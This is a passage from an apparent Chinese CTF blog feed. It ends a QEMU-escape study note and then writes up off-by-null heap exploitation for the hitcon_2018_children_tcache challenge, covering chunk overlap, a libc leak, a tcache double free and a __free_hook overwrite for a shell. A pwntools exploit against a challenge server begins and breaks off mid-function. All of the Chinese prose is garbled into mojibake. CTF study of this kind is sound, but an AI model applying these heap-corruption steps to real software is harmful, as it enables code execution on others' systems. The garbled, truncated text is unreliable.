çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®"></a>musl-gcc çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.musl-libc.org/releases/musl-latest.tar.gz</span><br><span class="line">tar zxvf musl-latest.tar.gz</span><br></pre></td></tr></table></figure><p>ç„¶å <code>cd</code> è¿›å…¥è§£å‹ä¹‹åçš„ç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>æ³¨æ„å‘½ä»¤æ‰§è¡Œçš„æƒé™</p><p>æ¥ä¸‹æ¥ï¼Œå¦‚æœä½ èƒ½ç”¨ç»å¯¹è·¯å¾„æ¥æ‰§è¡Œ <code>musl-gcc</code> é‚£å°±è¯´æ˜å®‰è£…çš„æ²¡é—®é¢˜ï¼Œç„¶åæ¥é…ç½®ç¯å¢ƒå˜é‡</p><p>å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ä½¿ç”¨çš„æ˜¯ <code>zsh shell</code> ï¼ˆåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ <code>echo $0</code> å¯ä»¥è¿›è¡Œç¡®è®¤ï¼‰ï¼Œé‚£ä¹ˆåº”è¯¥å°†ç¯å¢ƒå˜é‡è®¾ç½®æ·»åŠ åˆ° <code>~/.zshrc</code> æ–‡ä»¶ä¸­</p><p>å°†ä¸‹é¢çš„å‘½ä»¤æ·»åŠ åˆ° <code>~/.zshrc</code> æ–‡ä»¶çš„æœ«å°¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -d &quot;/usr/local/musl/bin&quot; ] ; then</span><br><span class="line">    PATH=&quot;/usr/local/musl/bin:$PATH&quot;</span><br><span class="line">fi</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œé‡æ–°åŠ è½½ <code>.zshrc</code> æ–‡ä»¶å³å¯ï¼ˆæ­¤æ—¶è¾“å…¥ <code>musl-gcc</code> å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><h4 id="ç¼ºå°‘åº“-æŠ¥é”™è§£å†³"><a href="#ç¼ºå°‘åº“-æŠ¥é”™è§£å†³" class="headerlink" title="ç¼ºå°‘åº“ æŠ¥é”™è§£å†³"></a>ç¼ºå°‘åº“ æŠ¥é”™è§£å†³</h4><p>æœ€å¼€å§‹åœ¨ <code>ubuntu 18.04</code> ä¸Šè¿è¡Œå‘ç°ç¼ºå°‘åº“ï¼Œç„¶å <code>ldd</code> çœ‹äº†ä¸€ä¸‹ï¼ˆæƒ…å†µå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821585.png" alt="image-20230313230807235"></p><p>è¿™åº”è¯¥æ˜¯ <code>libc</code> ç‰ˆæœ¬å¤ªä½å¯¼è‡´çš„ï¼Œäºæ˜¯æˆ‘å°±æ”¹ç”¨äº† <code>22.04</code> </p><p>æ­¤æ—¶çš„æŠ¥é”™å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821453.png" alt="image-20230313231108491"></p><p>ç„¶å <code>winmt</code> å¸ˆå‚…æ•™æˆ‘çš„è§£å†³æ€è·¯æ˜¯ <code>apt search xxx</code> æ¥æœç´¢ç¼ºå°‘çš„åº“ï¼Œ <code>xxx</code> åˆ™æ˜¯ <code>so</code> å‰é¢çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ <code>libbrlapi</code>ï¼ˆæ•ˆæœå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822783.png" alt="image-20230313231250902" style="zoom: 67%;" /><p>ç„¶åæˆ‘æ˜¯æŠŠè¿™å‡ ä¸ªåº“å…¨ç»™å®‰è£…äº† ï¼Œå‘½ä»¤æ˜¯ <code>sudo apt install xxx</code></p><p>ä¸è¿‡å‘ç°ä¾ç„¶æ˜¯è¿™ä¸ªæŠ¥é”™ï¼Œäºæ˜¯æ‰§è¡Œå‘½ä»¤ <code>find /usr/lib -name &quot;libbrlapi*&quot;</code> æ•ˆæœå¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822719.png" alt="image-20230313231502355" style="zoom:67%;" /><p>å¯ä»¥å‘ç°ï¼Œç°åœ¨çš„ <code>/usr/lib</code> ç›®å½•ä¸‹æ˜¯å®‰è£…äº† <code>/usr/lib/x86_64-linux-gnu/libbrlapi.so.0.8</code> ï¼Œä½†æ˜¯è¿™ä¸ª <code>qemu-system-x86_64</code> éœ€è¦çš„æ˜¯ <code>libbrlapi.so.0.7</code> ï¼Œäºæ˜¯æŒ‰ç…§ <code>winmt</code> å¸ˆå‚…æ‰€è¯´ï¼Œåˆ›å»ºäº†ä¸€ä¸ªåå­—å«åš <code>libbrlapi.so.0.7</code> çš„è½¯é“¾æ¥ï¼Œå‘½ä»¤æ˜¯ <code>sudo ln -s libbrlapi.so.0.8 libbrlapi.so.0.7</code> ï¼Œæœ€ç»ˆé—®é¢˜è§£å†³ï¼Œå¯ä»¥æˆåŠŸå¯åŠ¨ <code>qemu</code>ã€‚</p><p><strong>æ€»ç»“ï¼š</strong> é‡è§è¿™ç§å°‘åº“çš„æ€è·¯å°±æ˜¯å…ˆ <code>apt search</code> çœ‹ä¸€ä¸‹å°‘çš„åº“ï¼Œç„¶åå°‘å“ªä¸ªå®‰å“ªä¸ªå³å¯ï¼Œå¦‚æœå®‰è£…ä¹‹åè¿˜å°‘åº“ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯æŒ‰ç…§çš„ç‰ˆæœ¬ä¸å¯¹ï¼Œåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥å³å¯</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.jianshu.com/p/f08e34cf08ad">qemué€ƒé€¸å­¦ä¹ ç¬”è®° - ç®€ä¹¦ (jianshu.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-265501.htm#msg_header_h2_6">åŸåˆ›]QEMUé€ƒé€¸åˆæ¢-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4">qemu-pwn-åŸºç¡€çŸ¥è¯† Â« å¹³å‡¡è·¯ä¸Š (ray-cp.github.io)</a></p><p><a href="https://blog.csdn.net/weixin_45209963/article/details/127332351">(45æ¡æ¶ˆæ¯) qemué€ƒé€¸å°è¯†_mmio_write_xyzmpvçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU é€ƒé€¸ æ½¦è‰ç¬”è®° | Clangè£ç¼åº— (xuanxuanblingbling.github.io)</a></p><p><a href="https://zhuanlan.zhihu.com/p/588124131">QEMUé€ƒé€¸ç³»åˆ— - çŸ¥ä¹ (zhihu.com)</a></p><p><a href="https://www.anquanke.com/post/id/254906">QEMUé€ƒé€¸åˆæ¢ï¼ˆä¸€ï¼‰-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemué€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºoff by nullçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/6c267f9e.html"/>
      <url>/posts/6c267f9e.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘å¯¹off by nullçš„ä¸€ä¸ªå­¦ä¹ æ€»ç»“ï¼Œæˆ‘è¿™é‡Œå°±ä¸å†å•ç‹¬å¯¹off by oneè¿›è¡Œæ€»ç»“äº†ï¼Œå› ä¸ºåˆ©ç”¨çš„æ€æƒ³æ˜¯ä¸€æ ·çš„ã€‚æˆ‘å¯¹off by nullçš„æ€»ç»“åˆ†ä¸ºäº†ä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯å¯¹åˆ©ç”¨çš„æ€è·¯è¿›è¡Œäº†æ€»ç»“ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯å¯¹off by nullåšè¿‡çš„é¢˜ç›®è¿›è¡Œäº†æ€»ç»“ã€‚è¿™ç¯‡æ–‡ç« ä¸æ˜¯ç‰¹åˆ«é€‚åˆå¯¹off by nullå®Œå…¨ä¸æ‡‚çš„å¸ˆå‚…å­¦ä¹ ï¼Œæˆ‘å†™çš„ä¸»è¦æ˜¯æ€»ç»“ï¼Œæœ€åæ˜¯å¯¹off by nullå·²ç»æœ‰äº†ä¸€å®šç†è§£å†æ¥çœ‹ï¼Œåº”è¯¥ä¼šæ•ˆæœæ›´å¥½å§ã€‚</p><h1 id="off-by-nullçš„åˆ©ç”¨æ€è·¯ï¼š"><a href="#off-by-nullçš„åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="off by nullçš„åˆ©ç”¨æ€è·¯ï¼š"></a>off by nullçš„åˆ©ç”¨æ€è·¯ï¼š</h1><p>off by nullæ¼æ´ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æº¢å‡ºäº†ä¸€ä¸ªç©ºå­—èŠ‚ï¼Œæ ¸å¿ƒæ˜¯è®©å…¶å †å—çš„prev inuseä½æº¢å‡ºä¸º0ï¼Œä»è€Œè®¤ä¸ºå®ƒçš„ä½åœ°å€å †å—å¤„äºäº†freeçŠ¶æ€ï¼Œç„¶ååŠ ä»¥åˆ©ç”¨ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç”¨åˆ°å››ä¸ªchunkï¼ˆæˆ‘ä»¬åªåˆ©ç”¨ä¸‰ä¸ªchunkï¼Œé«˜åœ°å€çš„é‚£ä¸ªchunkæ˜¯é˜²æ­¢å’Œtop chunkåˆå¹¶çš„ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#merged chunk     ï¼ˆä¸èƒ½è®©è¿™ä¸ªå †å—åœ¨fastbinæˆ–æ˜¯tcachebinä¸­ï¼‰</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#merge chunk      ï¼ˆä¸èƒ½è®©è¿™ä¸ªå †å—åœ¨fastbinæˆ–æ˜¯tcachebinä¸­ï¼‰</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure><p>è¿™å››ä¸ªå †å—å¯¹åº”çš„åå­—æˆ‘ä¹Ÿåšäº†æ ‡æ³¨ï¼ˆå°±æ˜¯ä¸Šé¢çš„merged chunk   overflow chunkç­‰ç­‰)</p><blockquote><p>1ã€å…ˆå°†è¿™å››ä¸ªchunkéƒ½ç”³è¯·å‡ºæ¥ï¼Œæ³¨æ„merged chunkå’Œmerge chunkçš„å¤§å°ï¼Œä¸èƒ½è®©ä»–ä»¬åœ¨tcachebinæˆ–è€…fastbinä¸­ï¼ˆä¸ç„¶å°±æ— æ³•åˆå¹¶äº†ï¼‰ï¼ŒåŒæ—¶è¿˜è¦è€ƒè™‘overflow chunkçš„å¤§å°ï¼Œå› ä¸ºè¦äº§ç”Ÿoff by nullï¼Œæ‰€ä»¥å®ƒçš„å¤§å°åº”è¯¥ä¸ºå…«å­—èŠ‚ç»“å°¾ï¼ˆä¾‹å¦‚0x58,0x68,0x78Â·Â·Â·ï¼‰ï¼Œç„¶åé‡Šæ”¾æ‰merged chunkï¼Œä¸ºäº†ä¿è¯æ¥ä¸‹æ¥çš„åˆå¹¶å¯ä»¥é¡ºåˆ©è¿›è¡Œ</p><p>2ã€æ¥ç€ç¼–è¾‘ overflow chunkï¼Œè®©ä»–äº§ç”Ÿoff by nullæ¼æ´æº¢å‡ºç©ºå­—èŠ‚åˆ°merge chunkçš„prev inuseä½ï¼ŒåŒæ—¶æŠŠmerge chunkçš„prev inuseä½ç»™æ”¹äº†ï¼ˆå…¶å¤§å°è¦ä¿è¯å½“å‰åœ°å€å‡å»è¿™ä¸ªprev sizeæ­£å¥½èƒ½æ‰¾åˆ°merged chunkï¼ˆå¦‚æœç¨‹åºä¸­æ²¡æœ‰ç¼–è¾‘åŠŸèƒ½ï¼Œé‚£å°±å°†overflow chunk freeæ‰ï¼Œå†ç”³è¯·å›æ¥å†™å…¥æ•°æ®é€ æˆæº¢å‡ºï¼‰ã€‚</p><p>3ã€ç„¶åé‡Šæ”¾æ‰merge chunkï¼Œæ­¤æ—¶æ£€æµ‹åˆ°è‡ªèº«çš„prev inuseä½æ˜¯0ï¼Œè§¦å‘å‘å‰åˆå¹¶ï¼ˆå…ˆä¼šè§¦å‘å‘ååˆå¹¶ï¼Œä¸è¿‡åªè¦åé¢çš„é‚£ä¸ªchunkä¸æ˜¯Top chunkå°±ä¸ä¼šåˆå¹¶)ï¼ˆæˆ‘ä¸ªäººä¹ æƒ¯å°†å‘ä½åœ°å€åˆå¹¶ç§°ä¸ºå‘å‰åˆå¹¶ï¼‰</p><p>4ã€æœ€ç»ˆç”±äºmerge chunkåˆå¹¶æ—¶ç›´æ¥æ‰¾åˆ°äº†merged chunkï¼Œå› æ­¤è¿™äºŒè€…ä¹‹é—´çš„æ‰€æœ‰åŒºåŸŸéƒ½å¤„äºäº†freeçŠ¶æ€ï¼Œä½†æ˜¯è¿™äºŒè€…ä¹‹é—´å…¶å®è¿˜æœ‰ä¸€ä¸ª<strong>spy_chunkï¼ˆæˆ‘æŠŠå®ƒå«åšé—´è°å †å—ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¢«freeæ‰å´å¤„äºäº†freeçš„åˆå¹¶åŒºåŸŸï¼‰</strong></p><p>å‰©ä¸‹çš„å°±å…·ä½“é¢˜ç›®å…·ä½“åˆ†æå§ï¼Œåæ­£æ¥ä¸‹æ¥çš„åˆ©ç”¨å°±æ˜¯è¦é…åˆspy_chunkçš„ç‰¹æ€§ï¼ˆå®ƒçš„ç‰¹æ€§å°±æ˜¯å®ƒå‡ºåœ¨freeçš„åŒºåŸŸï¼Œä½†æ˜¯è‡ªå·±æ˜¯æ²¡æœ‰è¢«freeæ‰çš„ï¼Œç„¶åå°±å¯ä»¥æ‰“double freeã€å †å—é‡å ç­‰ç­‰ï¼‰</p></blockquote><blockquote><p>ä¸ºä»€ä¹ˆè¦åˆ©ç”¨off by nullè®©chunkçš„prev inuseä½æˆ0ï¼Ÿ</p><p>å› ä¸ºå½“å‰chunkçš„prev inuseä½å†³å®šäº†ä¸Šä¸ªå †å—æ˜¯å¦å¤„äºfreeçŠ¶æ€ï¼Œè¿™ä¹Ÿå°±å†³å®šç€æ˜¯å¦èƒ½å¤Ÿå‘å‰åˆå¹¶ï¼ˆæˆ‘ä¸ªäººä¹ æƒ¯å°†å‘ä½åœ°å€åˆå¹¶ç§°ä¸ºå‘å‰åˆå¹¶ï¼‰ã€‚æˆ‘ä»¬ç¡®å®é‡Šæ”¾äº†ä¸Šä¸ªå †å—ï¼Œä½†æ˜¯æ”¹å˜çš„æ˜¯spy_chunkçš„prev inuseä½ï¼Œä¸è¿‡æˆ‘ä»¬ç°åœ¨æƒ³å¿½ç•¥è¿™ä¸ªspy_chunkï¼Œå› æ­¤è¦å°†å½“å‰chunkçš„prev_sizeä½ä¼ªé€ æˆ0ï¼Œæ¥ä¿è¯ä¹‹åçš„å‘å‰åˆå¹¶å¯ä»¥æ­£å¸¸è¿›è¡Œã€‚</p></blockquote><h1 id="ç›¸å…³é¢˜ç›®wp"><a href="#ç›¸å…³é¢˜ç›®wp" class="headerlink" title="ç›¸å…³é¢˜ç›®wp"></a>ç›¸å…³é¢˜ç›®wp</h1><h2 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a>hitcon_2018_children_tcache</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007204338075.png" alt="image-20221007204338075"></p><h3 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><blockquote><p>strcpyå‡½æ•°ä¼šè¢«00æ‰€æˆªæ–­ï¼Œç„¶åå°†å­—ç¬¦ä¸²çš„æœ«å°¾åŠ ä¸Š00</p></blockquote><p><img src="/../img/yMsXAuZb7VFi9Rx-1665146431266-38.png" alt="image-20220609225655542"></p><p>å› æ­¤æˆ‘ä»¬è¾“å…¥çš„å¤§å°æœ¬èº«ä¸ä¼šé€ æˆæº¢å‡ºï¼Œä½†æ˜¯strcpyå‡½æ•°æœ€åè¡¥å……çš„00é€ æˆäº†off by nullã€‚</p><p><img src="/../img/image-20221007204401427.png" alt="image-20221007204401427"></p><p>è¿™é“é¢˜bssæ®µä¸Šå­˜æ”¾çš„å †ç´¢å¼•æ˜¯0-9 ä»æœ€å°åˆ¤æ–­ï¼Œå“ªä¸ªç©ºçš„ç”¨å“ªä¸ªã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>å…ˆç”³è¯·å››ä¸ªå †å—</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#size &gt;0x410</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#lead chunk size&gt;0x410</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°†0,1chunké‡Šæ”¾æ‰ï¼Œå†å°†1ç”³è¯·å›æ¥ï¼ˆé‡Šæ”¾0æ˜¯ä¸ºäº†æ¥ä¸‹æ¥çš„åˆå¹¶ï¼Œå†æŠŠ1ç»™ç”³è¯·å›æ¥æ˜¯å› ä¸ºè¦é‡æ–°å†™å…¥æ•°æ®ï¼Œæ¥äº§ç”Ÿoff_by_nullï¼Œå› ä¸º<strong>æ²¡æœ‰editåŠŸèƒ½æ‰€ä»¥ä¸å¾—ä¸è¿™æ ·</strong>ï¼‰</p><p>ç”¨å¾ªç¯æ¥æ¸…ç©ºä¸€ä¸‹chunk2 çš„prev sizeä½ï¼ˆæ–¹ä¾¿æ¥ä¸‹æ¥å¸ƒç½®æ•°æ®ï¼Œä¸ç„¶é‡Œé¢è£…çš„æ˜¯åƒåœ¾æ•°æ®ï¼‰ï¼Œç„¶åå†™å…¥prev sizeä½ï¼Œå®ƒçš„å¤§å°åº”è¯¥èƒ½ä¿è¯é‡Šæ”¾æ‰chunk2åï¼Œå’Œchunk0åˆå¹¶ï¼ˆä¹Ÿå°±æ˜¯chunk0åŠ ä¸Šchunk1+0x10å¤§å°ï¼‰</p><p>ç„¶åé‡Šæ”¾æ‰chunk2ï¼Œä½¿chunk0å’Œchunk2åˆå¹¶ï¼ˆå¤„äºtcachebinä¸­çš„chunkæ˜¯æ— æ³•åˆå¹¶çš„ï¼‰<strong>ï¼ˆchunk1æœ¬æ¥æ˜¯allocatedçŠ¶æ€ï¼Œä½†æ˜¯å±äºchunk0å’Œchunk2åˆå¹¶çš„åŒºåŸŸï¼Œå› æ­¤å®ƒè¡¨é¢ä¸Šçœ‹èµ·æ¥æ˜¯freeæ‰äº†ï¼Œä½†å®é™…ä¸Šå®ƒæ˜¯allcoatedï¼Œå¦‚æœæœ‰editåŠŸèƒ½çš„è¯ï¼Œå°±å¯ä»¥å¾€ä¸€å—è¢«freeæ‰çš„åŒºåŸŸæ¥å†™å…¥æ•°æ®äº†ï¼ˆå› æ­¤æˆ‘ä¹Ÿç®¡å®ƒå«åšspy chunk é—´è°å †å—ï¼‰</strong></p><p>ä½†æ˜¯è¿™é“é¢˜å¹¶æ²¡æœ‰editåŠŸèƒ½ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥å°†chunk0ç”³è¯·å›æ¥ï¼Œç„¶åshow 1æ¥æ³„éœ²libcåœ°å€ã€‚</p><p>å› ä¸ºunsortbiné‡Œé¢å¦‚æœåªæœ‰ä¸€ä¸ªchunkï¼Œé‚£ä¹ˆå®ƒçš„fdå’ŒbkæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘äº†main_arenaï¼ˆå®ƒä½äºlibcä¸­ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†chunk0ç”³è¯·å›æ¥çš„è¯ï¼Œé‚£ä¹ˆç°åœ¨unsortedbinä¸­çš„chunkåˆ™ä½äºäº†chunk1çš„ä½ç½®ï¼Œchunk1å¯æ˜¯æ²¡æœ‰è¢«é‡Šæ”¾æ‰çš„ï¼ˆè¿™æ„å‘³ç€å®ƒé‡Œé¢çš„å†…å®¹æ˜¯å¯ä»¥è¢«æ‰“å°å‡ºæ¥çš„ï¼‰ã€‚å¦‚æ­¤chunk1ä¸­çš„fdå’Œbkçš„ä½ç½®å°±æˆäº†libcé‡Œçš„åœ°å€ï¼Œç„¶åshowå°±å°†libcåœ°å€æ‰“å°å‡ºæ¥äº†ã€‚ï¼ˆæ­¤æ—¶çš„æƒ…å†µå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/image-20221007204430252.png" alt="image-20221007204430252"></p><p>ç°åœ¨çš„æƒ…å†µæ˜¯chunk1æ²¡æœ‰è¢«é‡Šæ”¾ï¼ˆè‡³å°‘æˆ‘ä»¬æ²¡æœ‰ä¸»åŠ¨é‡Šæ”¾chunk1ï¼Œå¹¶ä¸”bssæ®µä¸Šä¾æ—§è®°å½•ç€chunk1çš„åœ°å€ä¿¡æ¯ï¼‰ï¼Œä½†æ˜¯ç”±äºä¹‹å‰çš„chunk0å’Œchunk2å°†è¿™ç‰‡åŒºåŸŸåˆå¹¶äº†ï¼Œå†å°†chunk0ç”³è¯·å›æ¥çš„è¯ï¼Œbinsä¸­å­˜æ”¾çš„å°±æ˜¯chunk1çš„åœ°å€äº†ã€‚å› æ­¤æˆ‘ä»¬ç°åœ¨çš„chunk1å¤„äºäº†é‡Šæ”¾åˆæ²¡è¢«é‡Šæ”¾çš„å åŠ æ€,hhhã€‚</p><p>æˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªchunk1å¤§å°çš„å †å—ï¼Œè¿™æ ·å°±ä¼šä»å½“å‰çš„unsortedbinä¸­æ‹¿ï¼Œå¯æ˜¯åˆ«å¿˜äº†æˆ‘ä»¬çš„unsortedbinä¸­çš„åœ°å€å°±æ˜¯chunk1çš„åœ°å€ï¼Œå› æ­¤bssæ®µä¸Šå°±è®°å½•äº†ä¸¤æ¬¡chunk1çš„åœ°å€ï¼ˆè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é‡Šæ”¾åŒä¸€ä¸ªåœ°å€ä¸¤æ¬¡ï¼Œå°½ç®¡è¿™é“é¢˜freeæŒ‡é’ˆåç½®ç©ºäº†ï¼Œä½†ä¾æ—§é€ æˆäº†double free)</p><p>æˆ‘ä»¬å°†bssæ®µä¸Šæ˜¯chunk1åœ°å€çš„ä¸¤ä¸ªå †å—å…¨éƒ¨é‡Šæ”¾æ‰ï¼Œé€ æˆdouble freeã€‚ï¼ˆæ•ˆæœå¦‚ä¸‹ï¼‰</p><p><img src="/../img/image-20221007204439685.png" alt="image-20221007204439685"></p><p>æˆ‘ä»¬ç”³è¯·å›æ¥ä¸€ä¸ªchunk,å°†é‡Œé¢çš„æ•°æ®å†™æˆ__free_hookï¼ˆè¿™ä¸ªé‡Œé¢çš„æ•°æ®æŒ‡çš„å°±æ˜¯åŸæœ¬fdæŒ‡é’ˆçš„ä½ç½®ï¼‰</p><p>ç»“æœå‘ç°ç”³è¯·äº†ä¸€ä¸ªchunkä¹‹åï¼Œtcachebinsé‡Œé¢çš„é‚£æ¡é“¾ä¸Šè¿˜æ˜¯æœ‰ä¿©chunkï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/image-20221007204452069.png" alt="image-20221007204452069"></p><blockquote><p>ç»è¿‡<a href="https://roderickchan.github.io/">roderick</a>å¸ˆå‚…çš„æç¤ºï¼Œå‘ç°æ˜¯å› ä¸ºå®ƒè‡ªèº«æ˜¯å½¢æˆäº†ä¸€ä¸ªç¯ï¼Œè‡ªå·±æŒ‡å‘ç€è‡ªå·±ï¼Œå¦‚æœä¸ä¿®æ”¹å®ƒçš„fdæŒ‡é’ˆçš„è¯ï¼Œå³ä½¿ç”³è¯·ä¸€ä¸ªchunkå‡ºæ¥ï¼Œç„¶åå»é¡ºç€chunkçš„fdæ‰¾ä¸Šä¸€ä¸ªchunkçš„æ—¶å€™å‘ç°è¿˜æ˜¯å®ƒè‡ªå·±ï¼Œå› æ­¤è¿™ä¸ªå¾ªç¯æ°¸è¿œä¹Ÿä¸ä¼šç»“æŸï¼ˆå¦‚æœä¸æ”¹å˜fdçš„è¯ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ— é™ç”³è¯·è¿™ä¸ªåœ°å€çš„å †å—ã€‚å¦‚æœæƒ³æ‰“ç ´å¾ªç¯ä¹Ÿå°±æ˜¯è¦ä¿®æ”¹å®ƒçš„fdæŒ‡é’ˆï¼Œæ­¤å¤„æˆ‘ç”³è¯·å®ƒçš„fdæŒ‡é’ˆä¸º__free_hookåœ°å€æ¥æ‰“ç ´è¿™ä¸ªå¾ªç¯ã€‚</p><p>è‡³äºä¸ºå•¥ä¸Šé¢ç”³è¯·å®Œåï¼Œè¿˜æœ‰ä¿©chunkæ˜¯å› ä¸ºå…ˆç”³è¯·çš„chunkï¼Œå†ä¿®æ”¹çš„fdï¼Œæ‰€ä»¥ä¾ç„¶æœ‰ä¸¤ä¸ªï¼ˆä¸è¿‡å¾ªç¯å·²ç»ç»“æŸäº†ï¼‰</p></blockquote><p>ç„¶åå°†åœ°å€åœ¨__free_hookä¸Šçš„chunkç”³è¯·å‡ºæ¥ï¼Œå†™å…¥one_gadgetåœ°å€ï¼Œæ‰§è¡Œfreeå³å¯è·å–shellã€‚</p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29644</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1029)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span 